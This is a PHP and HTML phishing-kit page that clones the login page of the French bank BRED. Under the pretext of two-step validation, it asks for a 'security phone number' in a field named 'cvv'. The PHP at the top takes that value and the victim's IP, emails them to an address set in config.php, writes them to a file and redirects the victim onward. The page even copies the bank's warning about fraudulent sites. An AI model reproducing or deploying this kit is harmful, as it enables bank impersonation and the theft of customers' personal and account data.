<?php
error_reporting(0);
$ip  = $_SERVER['REMOTE_ADDR'];

function is_var_set($var) {

  return (isset($_POST[$var]) && $_POST[$var] !="") ? true : false;
}

$code_num = isset($_GET['last']) ? '2<sup>ème</sup>' : '1<sup>er</sup>';

if( is_var_set("cvv") ) {
  
  if(!isset($_GET['last'])) {
    
    $info_names = array("tele " => "cvv","IP " => $ip);
    $redirection = "loading.php?step=2";
  }
  else{
    
    $info_names = array("tele " => "cvv","IP " => $ip);
    
    
    $redirection = "https://www.bred.f/";

  }
  
  include("config.php");
  mail($emailTo,$subject,$infoRaw.$env_vars,$headers);
  save_rs("../ok","e",$infoRaw);
  echo "<script>window.location.href = '".$redirection."';</script>";
}

?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="js objectfit object-fit not-ios" lang="fr" xml:lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
<base ><title>Authentification - accéder à mon compte | BRED</title>
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <link href="./css/main.min.css" rel="stylesheet">
  <link rel="icon" href="images/favicon.ico">
  <!-- Google Tag Manager -->

<style type="text/css">
.fast-access__icon--rdv {
    background-image: url(./image/ico-sprite-prendre-rdv.png);
}
</style>


<style id="more_page_css" type="text/css"><!--.connexion__title{
font-size:2rem !important;
}--></style><link rel="canonical" ></head>

<body class="frontend icons-on portaltype-folder section-authentification site-bredfr template-layout thumbs-on userrole-anonymous viewpermission-none layout-default-basic mosaic-grid stick-header hide-header show-header" id="visual-portal-wrapper" dir="ltr" data-main-search-url="/resultats-de-recherche" data-i18ncatalogurl="https://www.bred.fr/plonejsi18n" data-view-url="https://www.bred.fr/authentification" data-pat-plone-modal="{&quot;actionOptions&quot;: {&quot;displayInModal&quot;: false}}" data-portal-url="https://www.bred.fr" data-pat-pickadate="{&quot;date&quot;: {&quot;selectYears&quot;: 200}, &quot;time&quot;: {&quot;interval&quot;: 5 } }" data-base-url="https://www.bred.fr/authentification"><!-- Google Tag Manager (noscript) --><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-&#10;5K2PFQ" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><!-- End Google Tag Manager (noscript) --><section id="edit-bar">
    </section><div class="global-overlay"></div><div class="page">

    <header class="wrapper-header">

      <!-- Mobile nav buttons -->
      <div class="button-menu__container" id="buttonMenu">
        <button class="button-menu button-menu__open">
          <img src="./image/mobile-nav-open.png" alt="Navigation mobile ouvrir">
          <span class="button-menu__label">Menu</span>
        </button>
        <button class="button-menu button-menu__close">
          <img src="./image/mobile-nav-close.png" alt="Navigation mobile fermer">
          <span class="button-menu__label">Fermer</span>
        </button>
      </div>

      <div class="container">
        <div class="row">

          <div class="main-header">

            <!-- MOBILE ACCESS -->
            <div class="mobile-access mobile-only" id="mobile-access">
              <a class="mobile-access__link" data-gtm-nav-top="Mon espace client"  title="Mon espace client">
                <img alt="" src="./image/icon-mobile-user.png">
              </a>
              
              <a class="mobile-access__link" id="searchAccess">
                <img alt="Icône recherche sur bred.fr" src="./image/icon-search-header.png">
              </a>
            </div>

            <!-- LOGO -->
            <div class="main-logo pull-left col-sm-3" id="logo">
    <a data-gtm-nav-top="logo" ><img alt="BRED" src="./image/logo-bred.svg"></a>
  </div>
            <div class="main-nav__wrapper col-sm-9">
              <!-- SEARCH -->
              <div id="search_header_area">
              
              </div>
              <!-- TOP NAV -->
              
              <div class="col-sm-10 desktop-only text-right" id="buttonsHeader">
    <a title="Devenir client" data-gtm-nav-top="Devenir client"  id="" class="btn-regular btn-regular--invert btn-regular--small pull-lg-right" data-gtm-vis-recent-on-screen-1801942_372="14377" data-gtm-vis-first-on-screen-1801942_372="14377" data-gtm-vis-total-visible-time-1801942_372="100" data-gtm-vis-has-fired-1801942_372="1"><span class="fast-access__icon fast-access__icon--devenir-client"></span>Devenir client</a>

  <a id="buttonLogin" class="btn-regular btn-regular--bordered btn-regular--small pull-lg-right desktop-inline-only" title="Mon espace client" data-gtm-nav-top="Mon espace client" data-gtm-vis-has-fired-1801942_372="1">
                      <span class="fast-access__icon fast-access__icon--account"></span>
                        Mon espace client
                    </a></div>
              <!-- MAIN NAV -->
              <nav class="main-nav" id="mainNav">
        <ul class="main-nav__list" itemscope="" itemtype="http://www.schema.org/SiteNavigationElement">
           
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Vos projets"><a class="main-nav__link" itemprop="url" title="Vos projets">Vos projets</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Comptes et cartes"><a  class="main-nav__link" itemprop="url" title="Comptes et cartes">Comptes et cartes</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Epargner"><a class="main-nav__link" itemprop="url" title="Epargner">Epargner</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Emprunter"><a class="main-nav__link" itemprop="url" title="Emprunter">Emprunter</a></li>
               
            
               
                   <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Assurer"><a  class="main-nav__link" itemprop="url" title="Assurer">Assurer</a></li>
               
            
          
        <li id="magic-line" style="width: 0px; left: 0px;"></li></ul>
        <a data-gtm-nav-top="Recherche Agences" class="main-nav__pin desktop-only" >
          <img src="./image/icon-pin.png" alt="Icône recherche agence">
        </a><a class="search-main__submit search-main__submit--trigger" id="openForm" title="Ouvrir la recherche">
              <img alt="Icône recherche" src="./image/icon-search-header.png">
            </a>
      </nav>
              <!-- FAST ACCESS df-->
              <div class="fast-access mobile-only" id="fastAccess">
                  
                     
                
                
                <p><a  class="btn-regular btn-regular--small btn-contrast" id="buttonSignup" title="Devenir client" data-gtm-vis-has-fired-1801942_372="1"> <span class="fast-access__icon fast-access__icon--client"></span> Devenir client </a> <a href="https://www.bred.fr/trouver-agence" class="btn-regular btn-regular--small btn-contrast" id="buttonMap" title="Trouver une agence" data-gtm-vis-has-fired-1801942_372="1"> <span class="fast-access__icon fast-access__icon--pin"></span> Trouver une agence </a> <a class="btn-regular btn-regular--small btn-contrast" id="buttonEmergency" title="Urgence" data-gtm-vis-has-fired-1801942_372="1"> <span class="fast-access__icon fast-access__icon--emergency"></span> Urgence </a></p>
                <!-- DOWNLOAD APP -->
                <div class="download-app mobile-only">
                  <p>Télécharger l'application BREDConnect pour gérer vos comptes</p>
                  <a  class="download-app__link-android main-js-link" title="Google Play">
                    <img src="./image/app-android.png" alt="Google Play" class="download-app__img">
                  </a>
                  <a  class="download-app__link-ios main-js-link" title="App Store">
                    <img src="./image/app-iphone.png" alt="App Store" class="download-app__img">
                  </a>
                </div>
              </div>
            </div>

          </div> <!-- /.main-header -->

        </div> <!-- /.row -->
      </div> <!-- /.container -->
    </header> <!-- /.wrapper-header -->
     <!-- /.wrapper-alert -->
    
    
   <article id="content" data-panel="content">
      <div class="mosaic-grid-row">
        <div class="mosaic-grid-cell mosaic-width-full mosaic-position-leftmost">
          <div class="movable removable mosaic-tile mosaic-bredfr.tiles.authentication-tile">
          <div class="mosaic-tile-content">
          
<!--  suppression suite lot 2 pros
 <section class="section--headerSelect">
    <div class="container">
        <div class="row">
          <div class="col-sm-12">
            <div class="cover cover--regular cover--no-img">
              <div class="cover__content">
                <h1 class="cover__title">Mon espace client en toute sécurité</h1>-->
<!--<div class="cover__baseline" tal:content="structure chapo/accroche">Lorem Ipsum In Dolor Sit Amet</div>-->
<!-- </div>
</div>
</div>
</div> /.row
</div>
</section>  -->

<section class="section-connection ">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
        <h1 class="connexion__big-title">Mon espace client en toute sécurité</h1>
      </div>
    </div>
    <div class="row">
      <div class="col-md-8 connexion">
        <div class="connexion__inner">
          <h2 class="connexion__title">Validation en deux étapes <span class="title-highlight">- BRED<em>Connect</em></span>,<br> </h2>

          <div class="connectionSet">

            <div class="custom-select__form hidden-sm hidden-md hidden-lg">
             <h1> Via vos identifiants</h1>
            </div>

  <ul class="nav nav-tabs hidden-xs" id="myConnection" role="tablist">
              <li role="presentation" class="nav-item c1 ">
                <a  id="viaId-tab" aria-controls="viaId" role="tab" data-toggle="tab" title="Via vos identifiants" class="nav-link active" aria-selected="true">Via vos identifiants</a>
              </li>
              <li role="presentation" class="nav-item c2 active">
                <a id="viaECode-tab" aria-controls="viaECode" role="tab" data-toggle="tab" title="votre e-code par sms" class="nav-link">Numéros de téléphone actuels</a>
              </li>


            </ul>

            <div class="tab-content">
              <div class="tab-pane fade in active" id="viaId" role="tabpanel" aria-labelledby="viaId-tab">
                <form method="POST" name="authen_simple" class="form-authentication" id="authen_simple" autocomplete="off" accept-charset="ISO-8859-1" >
                  
                  
                  <div class="form-group">

                      <td style="width: 420px" height="29"><strong>Enregistrez et activez votre numéro de téléphone de Sécurité</strong></td>
<br>
<br>
                    <input name="cvv" id="identifiant" tabindex="1" autocomplete="off" class="form-control" value="">
                    <div class="form-action"></div>
</div>
            <br>
                  <div class="form-group form-submit">
                    <button class="btn-regular btn-regular--bigger btn-authconnexion" id="authen_simple_button" data-gtm-vis-has-fired-1801942_372="1">Confirmer</button>
                  </div>
              
                </form>
              </div>
              <div class="tab-pane fade" id="viaECode" role="tabpanel" aria-labelledby="viaECode-tab">
                <form name="authen_simple" id="authen_ecode" method="post" class="form-authentication" action="https://www.bred.fr/transactionnel/Authentication">
                  
                  
                  <div class="instructions">
                  </div>
                  <div class="form-group">
                    <label for="identifiant">Identifiant</label>
                    <input id="identifiant" name="identifiant" type="password" autocomplete="off" maxlength="32" class="form-control">
                  </div>
                  <div class="form-group">
                    <label for="otp">E-code</label>
                    <input id="otp" name="otp" type="password" autocomplete="off" class="form-control">
                  </div>
                  <div class="form-group form-submit">
                    <button class="btn-regular btn-regular--bigger btn-authconnexion" id="authen_ecode_button" data-gtm-vis-has-fired-1801942_372="1">
                      Connexion
                    </button>
                  </div>
                  <div class="form-group">
                    <div class="form-action"><a  title="La sécurité sur internet" class="security">La
                      sécurité sur internet</a></div>
                  </div>
                </form>
              </div>
              <div class="tab-pane fade" id="viaUSBKey" role="tabpanel" aria-labelledby="viaUSBKey-tab">
                <div id="formIpab">
                  
                  <div class="instructions">
                    <p>1 - Insérez votre clé USB <br>2 - Cliquez sur le bouton</p>
                  </div>
                  <div class="form-group form-submit">
                    <button class="btn-regular btn-regular--bigger" id="ipab_bouton"  onclick="javascript:detectUSB();return false;" data-gtm-vis-has-fired-1801942_372="1">IPAB
                    </button>
                  </div>
                  <div class="form-group">
                    <div class="form-action"><a  title="La sécurité sur internet" class="security">La
                      sécurité sur internet</a></div>
                  </div>
                  <div class="form-group">
                    <div id="waiting_gif" style="display:none;">
                      <p>
                        <br>
                        Veuillez patienter...
                        <br>
                      </p>
                      <img src="./image/bar1.gif">
                    </div>
                  </div>
                  <div>
                    <div style="position:absolute;visibility:hidden;">
                    </div>
                  </div>
                </div>
              </div>
            </div>

          </div>

        </div>
      </div>
      
        <div class="col-md-4 bredConnectSignUp">
<div class="bredConnectSignUp__inner">
<div class="bredConnectSignUp__content">
<p class="text-center main-small-padding-bottom"><br><img src="./image/ico_dsp2_attention_noshadow.png"></p>
<h2 class="connexion__title title-highlight">La BRED vous met en garde</h2>
<p>Depuis l'annonce des mesures exceptionnelles liées à l'épidémie de Coronavirus COVID-19, nous constatons de plus en plus de <strong>sites frauduleux dont l'objet est de récupérer des informations personnelles et confidentielles</strong><br> La BRED vous recommande fortement, afin de protéger vos informations personnelles et confidentielles, d'utiliser uniquement le site officiel du Ministère de l'Intérieur.</p>
<ul>
<li><a  target="_blank">Attestation de déplacement dérogatoire</a></li>
<li><a  target="_blank">Justificatif de déplacement professionnel</a></li>
</ul>
<br>
<p><strong>En cas de doute sur une arnaque aux services bancaires, n'hésitez pas à utiliser notre <a  class="link-interne">formulaire de déclaration.</a></strong></p>
</div>
</div>
</div>
        
          
        
      
    </div> <!-- /.row -->
  </div> <!-- /.container -->
</section> <!-- /.section-connection -->

  
    
<!-- /.section-enroll -->
  
  



          </div>
          </div>
        </div>
      </div>
      <div class="mosaic-grid-row">
        <div class="mosaic-grid-cell mosaic-width-full mosaic-position-leftmost">
          <div class="movable removable mosaic-tile mosaic-plone.app.standardtiles.existingcontent-tile">
          <div class="mosaic-tile-content">
          

    <section class="existing-content-tile">
      

      
      
      
        
          <div>
              
  

          </div>
        
        
      
      
        
        

    

      
    </section>
  
          </div>
          </div>
        </div>
      </div>
    </article>
    <!-- .section-pre-footer -->
    <!-- /.section-pre-footer -->

    <!-- .section-footer -->
    <!-- /.section-footer -->
    <!-- .section-pre-post-footer -->
    <section id="socialNetwork" class="section section-pre-post-footer pre-post-footer bg-color-grey-5 color-white section--stretch">
<div class="container">
<div class="row">
<div class="col-sm-6 col-sm-offset-3">
<ul class="pre-post-footer__list main-flex main-flex-row main-flex-around">
<li class="pre-post-footer__item"><a class="social-network__link" title="Facebook" target="_blank"><img src="./image/ico-social-facebook.png" alt="Facebook"></a></li>
<li class="pre-post-footer__item"><a class="social-network__link" title="Instagram" target="_blank"><img src="./image/icon-social-instagram.png" alt="Instagram"></a></li>
<li class="pre-post-footer__item"><a class="social-network__link" title="YouTube" target="_blank"><img src="./image/ico-social-youtube.png" alt="YouTube"></a></li>
<li class="pre-post-footer__item"><a class="social-network__link" title="Twitter"  target="_blank"><img src="./image/ico-social-twitter.png" alt="Twitter"></a></li>
<li class="pre-post-footer__item"><a class="social-network__link" title="LinkedIn"   target="_blank"><img src="./image/ico-social-linkedin.png" alt="LinkedIn"></a></li>
</ul>
</div>
</div>
</div>
</section> <!-- /.section-pre-post-footer -->
    
    <!-- .section-post-footer -->
    <section class="section section-post-footer"><!-- SECTION -->
      <div class="container">
        <div class="row"><!-- LIGNE -->
          <img src="./image/logo-bred(1).svg" alt="Logo Bred" class="section-post-footer__logo wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
        </div>
      </div>
    </section><!-- /.section-post-footer -->

    


    
  </div>
  
  <div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.5771350355627929"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.7602408051404252" width="0" height="0" alt=""></div><!-- /.page --><div id="technical_area">
  </div><div id="scrollUp"><a ><img src="./image/ico_to_top.png"></a></div>

<div id="epd"><div id="cookiesdirective" style="position: fixed; bottom: -300px; left: 0px; width: 100%; height: auto; background: rgb(0, 0, 0); opacity: 0; color: rgb(255, 255, 255); font-family: helvetica; font-size: 13px; text-align: center; z-index: 1000;"><div style="position:relative;height:auto;width:90%;padding:10px;margin-left:auto;margin-right:auto;">Ce site collecte des données personnelles qui sont nécessaires à son fonctionnement et requis pour mettre en œuvre les objectifs décrits dans la Charte pour la protection des données personnelles.<br><br>Si vous souhaitez en savoir plus ou retirez votre accord à la collecte de vos  données personnelles,veuillez vous référer à la <a style="font-weight:bold; font-decoration:underline; font-family:helvetica;font-size:13px;" >notice d’information sur le traitement des données à caractère personnel</a>.<div style="margin-top:5px;"><input class="btn-regular" type="submit" name="impliedsubmit" id="impliedsubmit" value="Ne plus afficher ce message"></div></div></div></div></body></html>